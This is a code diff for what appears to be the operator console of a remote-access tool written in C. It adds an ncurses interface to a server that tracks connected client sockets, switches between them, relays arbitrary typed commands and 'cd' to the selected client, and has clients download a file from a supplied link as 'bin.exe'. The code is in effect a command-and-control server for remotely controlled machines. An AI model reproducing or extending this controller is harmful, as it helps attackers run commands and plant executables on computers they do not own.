@@ -36,15 +36,20 @@
 			int t_sock = 0;
 			char readBuf[3];
 			serverThread.connectedTo = 0;
-			while(loop != 1){
+			while(1){
 
 				loop = connection_handler(sock, inf);
+				if (serverThread.ncurses){ clearmain(); }
 				if(loop == 2){
 
 					t_sock++;
 					read(fd[0], readBuf, sizeof(readBuf));
 					int temp_s = atoi(readBuf);
 					*(serverThread.saved_sockets+t_sock) = temp_s;
+
+				} else if(loop == 1) {
+
+					break;
 
 				} else {
 					randptoScreen(sock);
@@ -108,7 +113,8 @@ void randptoScreen(int t)
 		printf("%s\n", readingBuf);
 
 	} else if(serverThread.ncurses){
-		// for ncurses
+		mvprintw(8, 0, "%s", readingBuf);
+		refresh();
 	}
 }
 
@@ -186,6 +192,7 @@ void printPrompt(int s)
 		getmaxyx(stdscr, row, col);
 		clastrow();
 		mvprintw(row-1, 0, "<p4p1 -%d-> ", s);
+		getstr(serverThread.buf);
 		refresh();
 	}
 	if (serverThread.cmd) {
@@ -205,6 +212,12 @@ void help()
 		printf("	- update -> accept new connection!\n");
 		printf("	- download -> download a file as bin.exe\n");
 		printf("	change its name if you want an other extention\n");
+	} else if(serverThread.ncurses) {
+		mvprintw(8, 0, "Help:\n");
+		mvprintw(9, 0, "	- Help -> show this message\n");
+		mvprintw(10, 0, "	- update -> accept new connection!\n");
+		mvprintw(11, 0, "	- download -> download a file as bin.exe\n");
+		mvprintw(12, 0, "	change its name if you want an other extention\n");
 	}
 }
 
@@ -231,14 +244,20 @@ void download(int sock)
 		printf("%s ", readPrompt);
 		fgets(link, BUFSIZE, stdin);
 	} else if(serverThread.ncurses){
-
+		getmaxyx(stdscr, row, col);
+		clastrow();
+		mvprintw(row-1, 0, "%s ", readPrompt);
+		refresh();
+		getstr(link);
 	}
 	write(sock, link, strlen(link));
 	read(sock, readPrompt, sizeof(readPrompt));
 	if(serverThread.cmd){
 		printf("[*] File downloaded\n");
 	} else if(serverThread.ncurses){
-
+		clearmain();
+		mvprintw(8, 0, "[*] File downloaded\n");
+		refresh();
 	}
 }
 
@@ -267,7 +286,22 @@ void changeClient(int * t)
 		}
 
 	} else if (serverThread.ncurses){
-		// for ncurses
+		char chclin[BUFSIZE];
+		getmaxyx(stdscr, row, col);
+		mvprintw(row-1, 0,"CliNum -%c- -%d- #> ", serverThread.cliNum, *t);
+		fgets(chclin, BUFSIZE, stdin);
+
+		if(!strcmp(chclin, "+\n")){
+
+			*t += 1;
+
+		} else if(!strcmp(chclin, "-\n")){
+
+			*t -= 1;
+
+		} else{
+			mvprintw(8, 0, "[!] Unknown command !");
+		}
 	}
 }
 
@@ -276,27 +310,48 @@ int commandInterpreter(struct server_info * inf, int * t)
 
 	int inc = *t;
 
-	if(!strcmp(serverThread.buf, "help\n")){
+	if(!strcmp(serverThread.buf, "help\n") || !strcmp(serverThread.buf, "help")){
 		help();
-	} else if(!strcmp(serverThread.buf, "whoami\n")){
+	} else if(!strcmp(serverThread.buf, "whoami\n") || !strcmp(serverThread.buf, "whoami")){
 		whoami();
-	} else if(!strcmp(serverThread.buf, "exit\n")){
+	} else if(!strcmp(serverThread.buf, "exit\n") || !strcmp(serverThread.buf, "exit")){
 
 		char * leave = "&&";
 		write(*(serverThread.saved_sockets+ inc), leave, strlen(leave));
 		return 1;
 
-	} else if(!strcmp(serverThread.buf, "change\n")){
+	} else if(!strcmp(serverThread.buf, "change\n") || !strcmp(serverThread.buf, "change")){
 
 		changeClient(t);
 
-	} else if(!strcmp(serverThread.buf, "update\n")){
+	} else if(!strcmp(serverThread.buf, "update\n") || !strcmp(serverThread.buf, "update")){
 
 		return 2;
 
-	} else if(!strcmp(serverThread.buf, "download\n")){
+	} else if(!strcmp(serverThread.buf, "download\n") || !strcmp(serverThread.buf, "download")){
 
 		download(*(serverThread.saved_sockets+inc));
+
+	} else if(serverThread.buf[0] == 'c' && serverThread.buf[1] == 'd'){
+
+		char prompt[80];
+		char dir[BUFSIZE];
+		for(int i = 3, q = 0; i < strlen(serverThread.buf); i++, q++){
+			dir[q] = serverThread.buf[i];
+		}
+		write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
+		read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
+
+		for(int i = 0; i < 80; i++){ prompt[i] = '\0';}
+
+		write(*(serverThread.saved_sockets+inc), dir, strlen(dir));
+		read(*(serverThread.saved_sockets+inc), prompt, sizeof(prompt));
+
+		if(serverThread.cmd){
+			printf("%s\n", prompt);
+		} else if (serverThread.ncurses){
+			mvprintw(8, 0,"%s", prompt);
+		}
 
 	} else {
 		write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
